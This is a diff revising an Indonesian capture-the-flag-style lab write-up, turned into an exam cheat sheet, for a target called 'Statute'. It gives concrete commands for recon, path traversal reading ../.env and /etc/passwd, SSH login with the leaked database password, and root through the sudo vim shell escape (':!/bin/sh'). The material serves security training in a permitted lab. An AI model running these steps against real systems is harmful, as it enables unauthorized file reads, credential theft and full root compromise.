@@ -1,8 +1,20 @@
-# Write-Up Lab Statute — Versi Closed Book
+# Write-Up Lab Statute — Panduan Ujian Close Book
 
 > **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.
 
-## 1. Gambaran Singkat
+## 0. Cara Menggunakan Catatan Ini
+
+Pelajari dokumen ini dalam tiga lapisan:
+
+```text
+Lapisan 1: hafalkan rantai serangan dan mnemonic.
+Lapisan 2: hafalkan indikator berhasil pada setiap fase.
+Lapisan 3: latih command pada Cheat Sheet 60 Detik.
+```
+
+---
+
+## 1. Peta Serangan
 
 | Komponen | Nilai |
 |---|---|
@@ -14,12 +26,12 @@
 | Privilege escalation | `sudo vim` |
 | Akses akhir | `root` |
 
-Rantai serangan:
+### Rantai Serangan
 
 ```text
 Recon
 → temukan endpoint download
-→ uji file normal
+→ buat baseline
 → ../.env
 → credential operator
 → SSH
@@ -28,7 +40,7 @@ Recon
 → root
 ```
 
-## 2. Mnemonic: R-D-T-S-V-R
+### Mnemonic: R-D-T-S-V-R
 
 ```text
 R = Recon
@@ -39,9 +51,24 @@ V = Vim
 R = Root
 ```
 
+### Checkpoint Ujian
+
+| Fase | Indikator yang Dicari |
+|---|---|
+| Recon | Port `22` dan `8080`, endpoint download |
+| Baseline | File valid `200`, file tidak ada `404` |
+| Traversal | Isi `.env` dapat dibaca |
+| SSH | Login sebagai `operator` |
+| Sudo | `(root) /usr/bin/vim` |
+| Root | `uid=0(root)` dan `whoami` menghasilkan `root` |
+
 ---
 
-# Fase 1 — Recon dan Menemukan Endpoint Download
+# Fase 1 — Recon dan Endpoint Download
+
+## 2. Tujuan
+
+Menemukan service web, SSH, dan parameter yang menerima nama file.
 
 ## 3. Scan Service
 
@@ -52,7 +79,7 @@ WEB="http://192.168.56.120:8080"
 nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
 ```
 
-Temuan penting:
+Indikator:
 
 ```text
 22/tcp   open  ssh
@@ -60,7 +87,7 @@ Temuan penting:
 8080/tcp open  http
 ```
 
-Catat SSH, tetapi jangan menebak password. Credential akan dicari dari aplikasi web.
+Catat SSH, tetapi jangan menebak password. Credential dicari dari aplikasi web.
 
 ## 4. Directory Enumeration
 
@@ -78,9 +105,9 @@ Endpoint penting:
 /documents
 ```
 
-Buka aplikasi, klik salah satu tombol download, lalu lihat request pada Burp Suite atau Developer Tools.
+Klik tombol download normal dan amati request melalui Burp Suite atau Developer Tools.
 
-Request normal:
+Contoh:
 
 ```http
 GET /download?file=uu-1-2024.pdf HTTP/1.1
@@ -95,9 +122,13 @@ Parameter file menerima nama file secara langsung.
 
 ---
 
-# Fase 2 — Membuat Baseline dan Menguji Traversal
+# Fase 2 — Baseline dan Path Traversal
 
-## 5. Baseline File Valid
+## 5. Tujuan
+
+Membedakan respons normal, file tidak ditemukan, dan traversal berhasil.
+
+## 6. Baseline File Valid
 
 ```bash
 curl --path-as-is -i \
@@ -111,7 +142,7 @@ HTTP/1.1 200 OK
 Content-Type: application/pdf
 ```
 
-## 6. Baseline File Tidak Ada
+## 7. Baseline File Tidak Ada
 
 ```bash
 curl --path-as-is -i \
@@ -124,9 +155,7 @@ Indikator:
 HTTP/1.1 404 Not Found
 ```
 
-Tujuan baseline adalah membedakan respons normal, error, dan traversal berhasil.
-
-## 7. Membaca `.env`
+## 8. Membaca `.env`
 
 ```bash
 curl --path-as-is -i \
@@ -153,7 +182,11 @@ documents/../.env
 .env pada root aplikasi
 ```
 
-Temuan ini membuktikan **Path Traversal / Arbitrary File Read**.
+Temuan ini membuktikan:
+
+```text
+Path Traversal / Arbitrary File Read
+```
 
 Validasi tambahan yang cukup:
 
@@ -163,13 +196,17 @@ curl --path-as-is -i \
   "$WEB/download?file=../../../../../etc/passwd"
 ```
 
-Hentikan setelah bukti minimum diperoleh. Tidak perlu membaca `/etc/shadow`, private key, atau data sensitif lain.
+> Hentikan setelah bukti minimum diperoleh. Tidak perlu membaca `/etc/shadow`, private key, atau data sensitif lain.
 
 ---
 
 # Fase 3 — Credential Reuse ke SSH
 
-## 8. Hubungkan Dua Temuan
+## 9. Tujuan
+
+Menguji apakah credential aplikasi juga digunakan untuk akun sistem.
+
+## 10. Hubungkan Temuan
 
 ```text
 Nmap menemukan SSH
@@ -182,7 +219,7 @@ uji credential reuse pada SSH
 Login:
 
 ```bash
-ssh operator@192.168.56.120
+ssh operator@"$TARGET"
 ```
 
 Masukkan password yang ditemukan pada `DB_PASSWORD`.
@@ -208,7 +245,11 @@ statute
 
 # Fase 4 — Enumerasi Sudo
 
-## 9. Periksa Hak Sudo
+## 11. Tujuan
+
+Mencari program yang dapat dijalankan sebagai root.
+
+## 12. Periksa Hak Sudo
 
 ```bash
 sudo -l
@@ -226,13 +267,15 @@ atau:
 (root) NOPASSWD: /usr/bin/vim
 ```
 
-Vim berbahaya bila dijalankan sebagai root karena mendukung shell escape:
+Mengapa berbahaya:
 
-```vim
-:!/bin/sh
+```text
+Vim mendukung shell escape.
+Program berjalan sebagai root.
+Shell yang dibuka dari Vim ikut berjalan sebagai root.
 ```
 
-Rumus hafalan:
+### Rumus Hafalan
 
 ```text
 sudo editor + shell escape = root shell
@@ -242,7 +285,11 @@ sudo editor + shell escape = root shell
 
 # Fase 5 — Root melalui Vim
 
-## 10. Cara Singkat
+## 13. Tujuan
+
+Menggunakan shell escape Vim untuk membuka shell root.
+
+## 14. Cara Singkat
 
 ```bash
 sudo vim -c ':!/bin/sh'
@@ -262,7 +309,7 @@ root
 uid=0(root) gid=0(root)
 ```
 
-## 11. Cara Interaktif
+## 15. Cara Interaktif
 
 ```bash
 sudo vim
@@ -288,11 +335,11 @@ Keluar dari Vim tanpa menyimpan:
 
 ---
 
-# 12. Troubleshooting Inti
+# 16. Troubleshooting Inti
 
 ### `/download` menghasilkan `400`
 
-Endpoint mungkin ada, tetapi parameter `file` wajib diisi. Lihat request saat tombol download normal diklik.
+Parameter `file` kemungkinan wajib diisi. Lihat request download normal dari browser.
 
 ### `../.env` menghasilkan `403`
 
@@ -306,18 +353,51 @@ curl --path-as-is -i \
 
 ### `../.env` menghasilkan `404`
 
-Coba kedalaman terbatas atau encoded slash:
+Coba kedalaman terbatas berdasarkan struktur aplikasi:
 
 ```text
 ../../.env
+```
+
+Apabila normalisasi URL terjadi, uji encoding secara terbatas:
+
+```text
 ..%2F.env
 ```
 
-Jangan melakukan brute force path tanpa arah. Gunakan struktur aplikasi dan respons baseline sebagai petunjuk.
+### `sudo vim -c ':!/bin/sh'` langsung keluar
+
+Gunakan cara interaktif:
+
+```bash
+sudo vim
+```
+
+Kemudian:
+
+```vim
+:!/bin/bash
+```
+
+> Jangan melakukan brute force path tanpa arah. Gunakan struktur aplikasi dan perbedaan respons baseline sebagai petunjuk.
 
 ---
 
-# 13. Cheat Sheet 60 Detik
+# 17. Cleanup
+
+Lab ini tidak mengubah file aplikasi saat eksploitasi utama.
+
+Pastikan:
+
+```text
+1. Tidak ada file tambahan yang dibuat.
+2. Tidak ada perubahan konfigurasi Vim.
+3. Sesi root dan SSH telah ditutup.
+```
+
+---
+
+# 18. Cheat Sheet 60 Detik
 
 ```bash
 TARGET="192.168.56.120"
@@ -343,6 +423,26 @@ ssh operator@"$TARGET"
 sudo -l
 sudo vim -c ':!/bin/sh'
 id
+whoami
+```
+
+---
+
+# 19. Checklist Ujian
+
+```text
+[ ] Port SSH dan web ditemukan
+[ ] Endpoint download ditemukan
+[ ] Request normal dengan parameter file dipahami
+[ ] Baseline 200 dan 404 dibuat
+[ ] .env berhasil dibaca
+[ ] Credential operator diperoleh
+[ ] SSH berhasil
+[ ] sudo -l diperiksa
+[ ] sudo vim ditemukan
+[ ] shell escape dijalankan
+[ ] uid=0(root) terbukti
+[ ] Sesi ditutup
 ```
 
 ## Kalimat Hafalan
